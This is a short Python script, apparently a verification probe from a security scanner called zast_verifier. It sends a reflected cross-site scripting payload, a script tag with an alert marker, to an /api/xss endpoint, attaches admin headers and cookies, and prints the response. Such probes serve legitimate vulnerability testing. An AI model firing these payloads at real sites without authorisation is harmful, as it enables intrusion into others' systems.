import requests

from zast_verifier import config


if __name__ == "__main__":
    base_url = 'https://wright-var-movie-retailer.trycloudflare.com/py'

    response = requests.get(
        url=f"{base_url}/api/xss",
        params={'name': "<script>alert('zast-xss-marker')</script>"},
        headers=config.get_admin_headers(),
        cookies=config.get_admin_cookies(),
    )

    print(f"Status code: {response.status_code}")
    print(f"Response text: {response.text}")
